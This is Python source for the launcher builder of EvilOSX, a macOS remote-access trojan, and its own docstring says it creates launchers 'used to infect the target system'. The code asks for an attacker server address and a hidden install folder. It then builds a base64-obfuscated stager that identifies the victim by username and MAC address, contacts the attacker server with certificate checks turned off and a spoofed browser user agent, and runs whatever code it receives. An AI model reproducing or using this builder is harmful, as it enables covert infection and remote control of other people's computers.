#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Builds launchers which are used to infect the target system."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

from sys import exit
import os
import fnmatch
import imp
import random
import string
import base64
import json
from textwrap import dedent
from server.loader_factory import LoaderFactory

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"


class Utils:
    """Static utility class."""

    def __init__(self):
        pass

    @staticmethod
    def random_string(size=None, numbers=False):
        """:return A randomly generated string of x characters.

        If no size is specified, a random number between 6 and 15 will be used.
        """
        name = ""
        if not size:
            size = random.randint(6, 15)

        for i in range(0, size):
            if not numbers:
                name += random.choice(string.ascii_letters)
            else:
                name += random.choice(string.ascii_letters + string.digits)
        return name

    @staticmethod
    def get_random_user_agent():
        """:return A random user-agent string."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
        ]
        return random.choice(user_agents)


class LauncherFactory:
    """Creates launchers."""

    def __init__(self):
        self._launchers = {}
        self._load_launchers()

    def _load_launchers(self):
        """Loads all launchers."""
        for root, dirs, files in os.walk("launchers"):
            for file_name in fnmatch.filter(files, "*.py"):
                launcher_name = file_name[0:-3]
                launcher_path = os.path.join(root, file_name)

                if launcher_name in ["template"]:
                    continue

                self._launchers[launcher_name] = imp.load_source(launcher_name, launcher_path).Launcher()

    def get_launchers(self):
        """:return A list of all launchers."""
        return self._launchers

    def get_launcher(self, index):
        """:return A tuple containg the launcher's name and class."""
        for i, (key, launcher) in enumerate(self.get_launchers().iteritems()):
            if i == index:
                return key, launcher

    def create_launcher(self, launcher_name, stager):
        """
        :param launcher_name: The name of the launcher to create.
        :param stager: The stager which the launcher should run.
        :return: The location to the created launcher.
        """
        output_extension, launcher_code = self._launchers[launcher_name].generate(stager)

        output_directory = os.path.dirname(os.path.realpath(__file__)) + "/builds/"
        output_name = "Launcher-" + Utils.random_string(9) + "." + output_extension
        output_file = os.path.join(output_directory, output_name)

        if not output_extension:
            print dedent(launcher_code)
        else:
            if not os.path.exists(output_directory):
                os.mkdir(output_directory)

            with open(os.path.join(output_file), "w") as launcher_out:
                launcher_out.write(dedent(launcher_code))
            return output_file


def create_stager(server_host, server_port, program_directory, loader_name, loader_options):
    """Creates the stager."""
    options = {
        "host": server_host,
        "port": server_port,
        "program_directory": program_directory,
        "loader_name": loader_name
    }

    if loader_options:
        options["loader_options"] = loader_options

    stager_code = """\
    import urllib2
    from urllib import urlencode
    import ssl
    import getpass
    import uuid

    %s = "%s"


    def get_key():
        return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))


    data = urlencode({
            "Cookie": "session=%s", 
            "Content-Type": get_key()
    })

    req_context = ssl.create_default_context()
    req_context.check_hostname = False
    req_context.verify_mode = ssl.CERT_NONE

    request = urllib2.Request(url="https://%s:%s/api/stager", headers={"User-Agent": "%s"}, data=data)    
    response = urllib2.urlopen(request, context=req_context)

    exec("".join(response.readlines()))
    """ % (
        Utils.random_string(), Utils.random_string(numbers=True),
        base64.b64encode(json.dumps(options)), server_host, server_port, Utils.get_random_user_agent()
    )

    return "echo \"import base64;exec(base64.b64decode('%s'))\" | python" % base64.b64encode(dedent(stager_code))


def main():
    server_host = raw_input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
    while True:
        try:
            server_port = int(raw_input(MESSAGE_INPUT + "Server port: "))
            break
        except ValueError:
            print MESSAGE_ATTENTION + "Invalid server port."
    program_directory = raw_input(
        MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: "
    )

    if not program_directory:
        random_directory = "~/Library/Containers/.%s" % Utils.random_string()

        program_directory = random_directory
        print MESSAGE_INFO + "Using: %s" % random_directory

    launcher_factory = LauncherFactory()
    loader_factory = LoaderFactory()

    # Prompt the user to select a launcher
    print MESSAGE_INFO + "%s available launchers: " % len(launcher_factory.get_launchers())
    for i, (key, launcher) in enumerate(launcher_factory.get_launchers().iteritems()):
        print "%s = %s -> %s" % (str(i), key, launcher.info["Description"])

    while True:
        try:
            launcher_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")

            if not launcher_index:
                launcher_name, launcher = launcher_factory.get_launcher(0)
            else:
                launcher_name, launcher = launcher_factory.get_launcher(int(launcher_index))

            break
        except ValueError:
            print MESSAGE_ATTENTION + "Invalid launcher."

    # Prompt the user to select a loader
    print MESSAGE_INFO + "%s available loaders: " % len(loader_factory.get_loaders())
    for i, (key, loader) in enumerate(loader_factory.get_loaders().iteritems()):
        print "%s = %s -> %s" % (str(i), key, loader.info["Description"])

    while True:
        try:
            loader_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")

            if not loader_index:
                loader_name, loader = loader_factory.get_loader(0)
            else:
                loader_name, loader = loader_factory.get_loader(int(loader_index))

            break
        except ValueError:
            print MESSAGE_ATTENTION + "Invalid loader."

    # Create the launcher
    loader_options = loader.setup()
    stager = create_stager(server_host, server_port, program_directory, loader_name, loader_options)

    print MESSAGE_INFO + "Creating \"%s\" launcher..." % launcher_name
    launcher_path = launcher_factory.create_launcher(launcher_name, stager)

    if launcher_path:
        print MESSAGE_INFO + "Launcher written to: %s" % launcher_path


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "\n" + MESSAGE_INFO + "Interrupted."
        exit(0)
